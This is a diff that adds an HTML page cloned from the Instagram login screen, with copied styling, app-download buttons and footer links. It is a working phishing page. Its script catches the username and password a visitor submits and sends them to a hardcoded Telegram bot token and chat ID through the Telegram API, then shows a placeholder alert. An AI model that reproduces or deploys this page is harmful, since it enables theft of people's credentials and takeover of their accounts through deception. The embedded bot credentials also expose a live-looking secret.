@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Login</title>
+  <style>
+    /* Reset and basic styles */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      background-color: #fff;
+      color: #262626;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: start;
+      padding: 20px 20px 60px;
+    }
+    a {
+      color: #3897f0;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+
+    /* Container */
+    .container {
+      max-width: 350px;
+      width: 100%;
+    }
+
+    /* Instagram Logo - normal font */
+    .logo {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      font-size: 48px;
+      font-weight: bold;
+      text-align: center;
+      margin: 40px 0 20px 0;
+      user-select: none;
+    }
+
+    /* Form */
+    form {
+      background: #fafafa;
+      /* border: 1px solid #dbdbdb; */ /* Border removed */
+      padding: 40px 40px 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      border-radius: 1px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 8px 7px 8px;
+      font-size: 14px;
+      width: 100%;
+      outline-offset: -2px;
+      outline-color: transparent;
+      transition: outline-color 0.2s ease-in-out;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      outline-color: #a8a8a8;
+      background-color: #fff;
+    }
+
+    /* Login button */
+    button.login-btn {
+      margin-top: 8px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 0;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease-in-out;
+    }
+    button.login-btn:hover:not(:disabled) {
+      background-color: #007acc;
+    }
+    button.login-btn:disabled {
+      opacity: 0.5;
+      cursor: default;
+    }
+
+    /* Forgot password */
+    .forgot-password {
+      text-align: center;
+      font-size: 12px;
+      margin: 20px 0 0 0;
+    }
+
+    /* Sign up section */
+    .signup-section {
+      margin: 20px 0 30px;
+      padding: 20px 0;
+      /* border: 1px solid #dadada; */ /* Border removed */
+      background: #fff;
+      border-radius: 1px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    /* Get the app section */
+    .get-app {
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+    .app-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .app-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      background: black;
+      color: white;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 6px 12px;
+      text-decoration: none;
+      height: 40px;
+      user-select: none;
+    }
+    .app-button svg {
+      height: 20px;
+      width: 20px;
+      margin-right: 8px;
+      fill: white;
+      flex-shrink: 0;
+    }
+
+    /* Footer navigation */
+    footer {
+      margin-top: auto;
+      max-width: 600px;
+      width: 100%;
+      padding: 20px 0;
+      user-select: none;
+    }
+    .footer-nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px 15px;
+      font-size: 12px;
+      color: #00376b;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+    .footer-nav a {
+      color: #00376b;
+      text-decoration: none;
+    }
+    .footer-nav a:hover {
+      text-decoration: underline;
+    }
+    .footer-branding {
+      color: #8e8e8e;
+      font-size: 12px;
+      text-align: center;
+      margin-top: 15px;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
+
+    /* Responsive - center on smaller */
+    @media (max-width: 400px) {
+      .container {
+        max-width: 95%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <h1 class="logo" aria-label="Instagram">Instagram</h1>
+
+    <form aria-label="Login form">
+      <input
+        type="text"
+        name="username"
+        autocomplete="username"
+        aria-required="true"
+        placeholder="Phone number, username, or email"
+        required
+      />
+      <input
+        type="password"
+        name="password"
+        autocomplete="current-password"
+        placeholder="Password"
+        aria-required="true"
+        required
+      />
+      <button type="submit" class="login-btn" aria-label="Log in to Instagram">Log in</button>
+    </form>
+
+    <p class="forgot-password">
+      <a href="#" tabindex="0" aria-label="Forgot password link">Forgot password?</a>
+    </p>
+
+    <section class="signup-section" aria-label="Sign up prompt">
+      Don't have an account? <a href="#" aria-label="Sign up for Instagram">Sign up</a>
+    </section>
+
+    <div class="get-app" aria-label="Get the app">
+      Get the app.
+    </div>
+
+    <div class="app-buttons" aria-label="Download Instagram mobile app">
+      <a href="#" class="app-button" aria-label="Download on the App Store">
+        <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24">
+          <path d="M19.7 12.2c-.1-2.7 2.2-3.9 2.3-4-1.3-1.9-3.4-2.2-4.1-2.2-1.7-.2-3.3.9-4.1.9-.8 0-2.1-.9-3.4-.9-1.8 0-3.5 1-4.4 2.7-1.9 3.3-.5 8.1 1.3 10.7.9 1.3 2 2.8 3.4 2.7 1.4-.1 1.9-.9 3.4-.9s1.9.9 3.4.9c1.5 0 2.5-1.3 3.4-2.7 1-1.7 1.4-3.3 1.5-3.4-.1-.1-2.7-1-.1-3.9z"></path>
+        </svg>
+        App Store
+      </a>
+      <a href="#" class="app-button" aria-label="Get it on Google Play">
+        <svg aria-hidden="true" focusable="false" viewBox="30 336.7 120.9 129.2" style="height:20px; width:20px; margin-right:8px;">
+          <path fill="#FFD400" d="M36.7 337.3v128.3l50.2-64-.3-64.3-49.9.1z" />
+          <path fill="#FF3333" d="M85.5 337.6l-24.8 24.7 24.5 46 25.4-25.4-25.1-45.3z" />
+          <path fill="#48FF48" d="M36.7 465.6l50.2-64 25.7 25.5v-128.3z" />
+          <path fill="#3333FF" d="M111.8 436.2l-26.1-25.9 26.4-26.2 24.8 25.1-25.2 25z" />
+        </svg>
+        Google Play
+      </a>
+    </div>
+  </div>
+
+  <footer role="contentinfo" aria-label="Footer navigation and branding">
+    <nav class="footer-nav" aria-label="Footer links">
+      <a href="#" tabindex="0">ABOUT US</a>
+      <a href="#" tabindex="0">SUPPORT</a>
+      <a href="#" tabindex="0">BLOG</a>
+      <a href="#" tabindex="0">PRESS</a>
+      <a href="#" tabindex="0">API</a>
+      <a href="#" tabindex="0">JOBS</a>
+      <a href="#" tabindex="0">PRIVACY</a>
+      <a href="#" tabindex="0">TERMS</a>
+      <a href="#" tabindex="0">DIRECTORY</a>
+      <a href="#" tabindex="0">LANGUAGE</a>
+    </nav>
+    <div class="footer-branding" aria-label="Instagram branding">
+      INSTAGRAM
+    </div>
+  </footer>
+
+  <script>
+    async function sendToTelegram(username, password) {
+      const botToken = '8157111925:AAEq1sV-01ewJ29tIjXjMmXWKfWx4lU5isI';
+      const chatId = '7351989900';
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        if (!response.ok) {
+          console.error('Failed to send message to Telegram');
+        }
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+
+    document.querySelector('form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const username = this.username.value;
+      const password = this.password.value;
+
+      sendToTelegram(username, password);
+
+      alert('Log in clicked');
+    });
+  </script>
+</body>
+  </html>
